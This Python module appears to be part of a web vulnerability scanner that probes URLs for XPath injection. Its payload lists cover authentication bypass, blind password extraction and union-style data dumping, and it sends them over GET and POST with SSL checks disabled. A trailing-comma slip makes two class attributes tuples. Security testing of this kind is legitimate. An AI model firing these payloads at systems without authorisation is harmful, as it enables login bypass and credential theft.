# scanner/injection/xpath.py
"""
XPath Injection Scanner

Detects XPath injection vulnerabilities that can lead to:
- Authentication bypass
- Information disclosure
- Data extraction from XML documents

OWASP: A03:2021 - Injection
CWE-643: Improper Neutralization of Data within XPath Expressions
"""

import asyncio
import aiohttp
import re
from typing import List, Dict, Optional
from urllib.parse import urlencode

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class XPathInjectionScanner(BaseScanner):
    """Scanner for XPath injection vulnerabilities"""

    name="XPath Injection Scanner",
    description="Detects XPath injection vulnerabilities",
    owasp_category=OWASPCategory.A03_INJECTION
    
    def __init__(self):
        
        # XPath injection payloads
        self.payloads = {
            # Authentication bypass
            "auth_bypass": [
                "' or '1'='1",
                "' or ''='",
                "x' or 1=1 or 'x'='y",
                "admin' or '1'='1",
                "'] | //user/*[contains(*,'",
                "' or 1=1 or ''='",
                "admin'--",
                "' or count(//user)>0 or 'x'='y",
                "x']/..//password | //x[' ",
            ],
            
            # Boolean-based
            "boolean": [
                "' and '1'='1",
                "' and '1'='2",
                "1 and 1=1",
                "1 and 1=2",
                "x' and count(/*)>0 and 'x'='x",
                "x' and count(/*)=0 and 'x'='x",
            ],
            
            # Error-based
            "error": [
                "'",
                "\"",
                "]]>",
                "<!--",
                "'\"",
                "x]",
                "//*",
                "x' and zabcdef=x and 'x'='y",
            ],
            
            # Data extraction
            "extraction": [
                "'] | //* | ['",
                "') | //* | ('",
                "x']/..//* | //x['",
                "x' or name()='username' or 'x'='y",
                "' or substring(name(/*[1]),1,1)='a' or ''='",
            ],
            
            # Blind XPath
            "blind": [
                "x' or substring(//user[1]/password,1,1)='a' or 'x'='y",
                "x' or string-length(//user[1]/password)>0 or 'x'='y",
                "x' or contains(//user[1]/password,'a') or 'x'='y",
            ],
            
            # Union-based
            "union": [
                "'] | //user/password | //user['",
                "' | //user/* | '",
                "x']/..//user/password | //x['",
            ],
        }
        
        # Error indicators
        self.error_indicators = [
            r"XPathException",
            r"XPath.*error",
            r"XPathEvalError",
            r"SimpleXMLElement",
            r"DOMXPath",
            r"Invalid expression",
            r"xmlXPathEval",
            r"xpath.*syntax",
            r"XPathResult",
            r"unterminated.*string",
            r"libxml.*error",
            r"XPATH.*warning",
            r"xmlXPathCompOpEval",
            r"Expression must evaluate",
            r"xquery",
        ]
        
        # XML/XPath related parameters
        self.target_params = [
            "xml", "xpath", "query", "search", "username", "user",
            "password", "pass", "name", "id", "node", "path",
            "element", "attr", "attribute", "value", "data",
        ]
    
    async def scan(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str] = None
    ) -> List[Vulnerability]:
        """
        Scan for XPath injection vulnerabilities.
        """
        vulnerabilities = []
        
        if not params:
            params = {p: "test" for p in self.target_params[:5]}
        
        # Get baseline response
        baseline = await self._get_baseline(session, url, params)
        
        for param_name, original_value in params.items():
            # Test auth bypass
            auth_vulns = await self._test_auth_bypass(
                session, url, params, param_name, baseline
            )
            vulnerabilities.extend(auth_vulns)
            
            # Test error-based
            error_vulns = await self._test_error_based(
                session, url, params, param_name
            )
            vulnerabilities.extend(error_vulns)
            
            # Test boolean-based
            bool_vulns = await self._test_boolean_based(
                session, url, params, param_name, baseline
            )
            vulnerabilities.extend(bool_vulns)
            
            if auth_vulns or error_vulns or bool_vulns:
                break
        
        return vulnerabilities
    
    async def _get_baseline(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str]
    ) -> Dict:
        """Get baseline response"""
        try:
            async with session.get(
                url,
                params=params,
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as response:
                text = await response.text()
                return {
                    "status": response.status,
                    "length": len(text),
                    "text": text
                }
        except:
            return {"status": 0, "length": 0, "text": ""}
    
    async def _test_auth_bypass(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str],
        param_name: str,
        baseline: Dict
    ) -> List[Vulnerability]:
        """Test for XPath authentication bypass"""
        vulnerabilities = []
        
        for payload in self.payloads["auth_bypass"]:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                # Test GET
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    text = await response.text()
                    
                    # Check for success (different from baseline, no errors)
                    if self._check_bypass_success(text, baseline):
                        vulnerabilities.append(Vulnerability(
                            vuln_type="XPath Injection - Authentication Bypass",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence="Response indicates successful bypass",
                            description="XPath injection allows authentication bypass",
                            cwe_id="CWE-643",
                            remediation=self._get_remediation()
                        ))
                        return vulnerabilities
                
                # Test POST
                async with session.post(
                    url,
                    data=test_params,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    text = await response.text()
                    
                    if self._check_bypass_success(text, baseline):
                        vulnerabilities.append(Vulnerability(
                            vuln_type="XPath Injection - Authentication Bypass",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence="POST bypass successful",
                            description="XPath injection via POST",
                            cwe_id="CWE-643",
                            remediation=self._get_remediation()
                        ))
                        return vulnerabilities
            
            except Exception:
                continue
        
        return vulnerabilities
    
    async def _test_error_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str],
        param_name: str
    ) -> List[Vulnerability]:
        """Test for error-based XPath injection"""
        vulnerabilities = []
        
        for payload in self.payloads["error"]:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    text = await response.text()
                    
                    error_found, evidence = self._check_xpath_errors(text)
                    
                    if error_found:
                        vulnerabilities.append(Vulnerability(
                            vuln_type="XPath Injection - Error Based",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=evidence,
                            description="XPath error indicates injection vulnerability",
                            cwe_id="CWE-643",
                            remediation=self._get_remediation()
                        ))
                        return vulnerabilities
            
            except Exception:
                continue
        
        return vulnerabilities
    
    async def _test_boolean_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str],
        param_name: str,
        baseline: Dict
    ) -> List[Vulnerability]:
        """Test for boolean-based XPath injection"""
        vulnerabilities = []
        
        # Pairs of true/false conditions
        conditions = [
            ("' and '1'='1", "' and '1'='2"),
            ("1 and 1=1", "1 and 1=2"),
            ("x' and count(/*)>0 and 'x'='x", "x' and count(/*)=-1 and 'x'='x"),
        ]
        
        for true_cond, false_cond in conditions:
            try:
                # True condition
                test_params_true = params.copy()
                test_params_true[param_name] = true_cond
                
                async with session.get(
                    url,
                    params=test_params_true,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    true_text = await response.text()
                    true_length = len(true_text)
                
                # False condition
                test_params_false = params.copy()
                test_params_false[param_name] = false_cond
                
                async with session.get(
                    url,
                    params=test_params_false,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    false_text = await response.text()
                    false_length = len(false_text)
                
                # Compare responses
                length_diff = abs(true_length - false_length)
                
                if length_diff > 50:
                    vulnerabilities.append(Vulnerability(
                        vuln_type="XPath Injection - Boolean Based",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=f"True: {true_cond}, False: {false_cond}",
                        evidence=f"Response difference: {length_diff} bytes",
                        description="Boolean-based XPath injection confirmed",
                        cwe_id="CWE-643",
                        remediation=self._get_remediation()
                    ))
                    return vulnerabilities
            
            except Exception:
                continue
        
        return vulnerabilities
    
    def _check_bypass_success(self, response: str, baseline: Dict) -> bool:
        """Check if bypass was successful"""
        # Success indicators
        success_patterns = [
            r"welcome", r"logged.*in", r"dashboard", r"success",
            r"authenticated", r"session", r"profile",
        ]
        
        response_lower = response.lower()
        baseline_lower = baseline.get("text", "").lower()
        
        for pattern in success_patterns:
            if re.search(pattern, response_lower) and not re.search(pattern, baseline_lower):
                return True
        
        # Significant length increase
        if len(response) > baseline.get("length", 0) * 1.3:
            # But not error pages
            if not self._check_xpath_errors(response)[0]:
                return True
        
        return False
    
    def _check_xpath_errors(self, response: str) -> tuple:
        """Check for XPath error messages"""
        for pattern in self.error_indicators:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response), match.end() + 50)
                evidence = response[start:end]
                return True, evidence
        
        return False, ""
    
    def _get_remediation(self) -> str:
        """Get remediation advice"""
        return """
1. Use parameterized XPath queries when available
2. Implement strict input validation with allowlists
3. Escape special XPath characters before query construction
4. Use XPath libraries with built-in protection
5. Consider using XQuery with parameterization
6. Implement least privilege for XML data access

Characters to escape:
- Single quote (') -> &apos;
- Double quote (") -> &quot;
- Ampersand (&) -> &amp;
- Less than (<) -> &lt;
- Greater than (>) -> &gt;
"""